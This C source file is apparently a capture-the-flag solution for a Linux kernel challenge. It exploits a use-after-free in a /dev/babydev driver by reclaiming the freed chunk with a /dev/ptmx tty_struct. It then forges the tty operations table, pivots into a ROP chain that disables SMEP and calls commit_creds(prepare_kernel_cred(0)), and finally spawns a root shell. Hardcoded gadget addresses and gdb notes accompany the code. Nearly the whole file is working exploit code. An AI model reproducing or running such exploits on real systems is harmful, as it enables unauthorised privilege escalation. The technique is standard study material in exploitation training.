#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>

#define POP_RDI_RET 0xffffffff810d238d
#define POP_RAX_RET 0xffffffff8100ce6e
#define MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80
#define MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5
#define SWAPGS_POP_RBP_RET 0xffffffff81063694
#define IRETQ_RET 0xffffffff814e35ef


size_t commit_creds = 0xffffffff810a1420, prepare_kernel_cred = 0xffffffff810a1810;

size_t user_cs, user_ss, user_rflags, user_sp;

void saveStatus(){
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
}


void getRootPrivilige(void){
    void * (*prepare_kernel_cred_ptr)(void *) = prepare_kernel_cred;
    int (*commit_creds_ptr)(void *) = commit_creds;
    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(NULL));
}


void getRootShell(void){   
    if(getuid())
    {
        printf("\033[31m\033[1m[x] Failed to get the root!\033[0m\n");
        exit(-1);
    }

    printf("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n");
    system("/bin/sh");
}

int main(void){
    saveStatus();


    int fd1 = open("/dev/babydev", 2);
    /*
    0xffffffffc000004f:  mov    rdi,0xffffffffc0001034
    => 0xffffffffc0000056:  mov    QWORD PTR [rip+0x2473],rax        # 0xffffffffc00024d0
    0xffffffffc000005d:  mov    QWORD PTR [rip+0x2470],0x40        # 0xffffffffc00024d8

    gdb-peda$ x/10gx 0xffffffffc00024d0
    0xffffffffc00024d0:     0xffff880003616480      0x0000000000000040
    0xffffffffc00024e0:     0x0000000000000000      0x0000000000000000
    */
    
    int fd2 = open("/dev/babydev", 2);
    /*
    0xffffffffc000004f:  mov    rdi,0xffffffffc0001034
    => 0xffffffffc0000056:  mov    QWORD PTR [rip+0x2473],rax        # 0xffffffffc00024d0
    0xffffffffc000005d:  mov    QWORD PTR [rip+0x2470],0x40        # 0xffffffffc00024d8
    0xffffffffc0000068:  call   0xffffffff8118b077
    0xffffffffc000006d:  xor    eax,eax
    0xffffffffc000006f:  pop    rbp
    [------------------------------------stack-------------------------------------]
    0000| 0xffff880000a67c58 --> 0xa67ca8
    0004| 0xffff880000a67c5c --> 0xffff8800
    0008| 0xffff880000a67c60 --> 0x8120ff7f
    0012| 0xffff880000a67c64 --> 0xffffffff
    0016| 0xffff880000a67c68 --> 0x27cfc88
    0020| 0xffff880000a67c6c --> 0xffff8800
    0024| 0xffff880000a67c70 --> 0x27cfc88
    0028| 0xffff880000a67c74 --> 0xffff8800
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value

    Breakpoint 1, 0xffffffffc0000056 in ?? ()
    gdb-peda$ p $rax
    $2 = 0xffff880003616380
    */

    ioctl(fd1, 0x10001, 0x2e0);
    close(fd1);


    int fd3 = open("/dev/ptmx", 2);


    size_t fake_tty[0x20];
    read(fd2, fake_tty, 0x40);
    printf("%x", fake_tty[3]);


    char buf[0x50];

    size_t rop[0x20], p = 0;
    rop[p++] = POP_RDI_RET;
    rop[p++] = 0x6f0;
    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = getRootPrivilige;
    rop[p++] = SWAPGS_POP_RBP_RET;
    rop[p++] = 0;
    rop[p++] = IRETQ_RET;
    rop[p++] = getRootShell;
    rop[p++] = user_cs;
    rop[p++] = user_rflags;
    rop[p++] = user_sp;
    rop[p++] = user_ss;

    size_t fake_op[0x30];
    for(int i = 0; i < 0x10; i++)
        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;

    fake_op[0] = POP_RAX_RET;
    fake_op[1] = rop;


    fake_tty[3] = fake_op;  // user mode stack addr
    write(fd2, fake_tty, 0x40);

    write(fd3, buf, 0x8);

    return 0;
}